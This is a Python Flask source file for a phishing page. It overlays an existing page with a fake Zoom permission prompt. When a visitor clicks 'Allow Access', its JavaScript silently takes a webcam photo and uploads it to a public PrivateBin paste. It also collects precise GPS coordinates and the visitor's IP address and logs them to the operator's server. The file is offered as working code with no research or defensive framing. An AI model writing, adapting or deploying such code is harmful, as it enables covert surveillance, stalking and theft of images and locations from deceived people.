from flask import Flask, request, jsonify, redirect
import logging
from datetime import datetime
import os
import json
import requests  # For PrivateBin API

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('gps_logger')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Your existing styles remain unchanged */
        .doorDash-heading {{
          font-family: 'Inter', sans-serif;
          font-weight: 700;
          font-size: 22px;
          color: #2E3131;
          letter-spacing: -0.3px;
          margin-bottom: 8px;
        }}
        .doorDash-text {{
          font-family: 'Inter', sans-serif;
          font-weight: 400;
          font-size: 16px;
          color: #6B7177;
          line-height: 1.5;
          margin-bottom: 20px;
        }}
        .doorDash-button {{
          font-family: 'Inter', sans-serif;
          font-weight: 600;
          font-size: 16px;
        }}
        .gps-overlay {{
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0,0,0,0.8);
          display: flex;
          justify-content: center;
          align-items: center;
          z-index: 10000;
        }}
        .gps-modal {{
          background: white;
          padding: 25px;
          border-radius: 10px;
          max-width: 400px;
          text-align: center;
        }}
        .gps-btn {{
          background: #0B5CFF;
          color: white;
          border: none;
          padding: 12px 25px;
          border-radius: 5px;
          font-size: 16px;
          cursor: pointer;
          margin-top: 15px;
          font-weight: bold;
        }}
    </style>
</head>
<body>
    <!-- Your existing content -->
    {existing_content}
    
    <!-- GPS Permission Overlay -->
    <div class="gps-overlay">
        <div class="gps-modal">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" width="150" alt="Zoom">
            <h2 class="doorDash-heading">Allow Zoom to use your device for video conferences</h2>
            <p class="doorDash-text">Allow us access to things like your camera, location, and microphone to continue using Zoom</p>
            <button class="gps-btn" id="gps-allow-btn">Allow Access</button>
        </div>
    </div>

    <script>
        async function uploadToPrivateBin(imageData) {{
            try {{
                // Using a public PrivateBin instance (you may want to host your own)
                const response = await fetch('https://privatebin.net/', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Requested-With': 'JSONHttpRequest'
                    }},
                    body: new URLSearchParams({{
                        'data': JSON.stringify({{
                            'paste': imageData,
                            'expire': '1week',
                            'formatter': 'plaintext',
                            'burnafterreading': '0',
                            'opendiscussion': '0'
                        }})
                    }})
                }});
                
                const result = await response.json();
                if (result.status === 0 && result.url) {{
                    await fetch('/log', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            type: 'image_upload',
                            ip: await fetch('/getip').then(r => r.text()),
                            paste_url: result.url,
                            timestamp: new Date().toISOString()
                        }})
                    }});
                    return result.url;
                }}
                throw new Error(result.message || 'Upload failed');
            }} catch (error) {{
                console.error('Upload error:', error);
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'upload_error',
                        error: error.toString(),
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    }})
                }});
                return null;
            }}
        }}

        async function takePicture() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise((resolve) => {{
                    video.onloadedmetadata = () => {{
                        video.play();
                        resolve();
                    }};
                }});
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                stream.getTracks().forEach(track => track.stop());
                
                return canvas.toDataURL('image/jpeg', 0.8);
            }} catch (error) {{
                console.error('Camera error:', error);
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'camera_error',
                        error: error.toString(),
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    }})
                }});
                return null;
            }}
        }}

        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
            try {{
                // Log permission request
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'permission_request',
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    }})
                }});
                
                // Take picture and upload Base64
                const imageData = await takePicture();
                if (imageData) {{
                    await uploadToPrivateBin(imageData);
                }}
                
                // Get location
                const position = await new Promise((resolve, reject) => {{
                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }});
                }});
                
                // Log location
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'location_data',
                        ip: await fetch('/getip').then(r => r.text()),
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString()
                    }})
                }});
                
                // Remove overlay
                document.querySelector('.gps-overlay').remove();
            }} catch (error) {{
                console.error('Error:', error);
                await fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        type: 'error',
                        error: error.toString(),
                        ip: await fetch('/getip').then(r => r.text()),
                        timestamp: new Date().toISOString()
                    }})
                }});
                alert('Error occurred: ' + error.message);
            }}
        }});
    </script>
</body>
</html>
"""

@app.route('/')
def serve_page():
    """Serve the page with GPS overlay"""
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Page served to IP: {client_ip}")
    
    # Load your existing page.html content
    with open('page.html', 'r') as f:
        existing_content = f.read()
    
    return HTML_TEMPLATE.format(existing_content=existing_content)

@app.route('/getip')
def get_ip():
    """Endpoint to get client IP"""
    return request.headers.get('X-Forwarded-For', request.remote_addr)

@app.route('/log', methods=['POST'])
def log_data():
    """Central logging endpoint"""
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Enhanced logging with all relevant data
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'client_ip': client_ip,
        'event_data': data
    }
    
    logger.info(json.dumps(log_entry, indent=2))
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
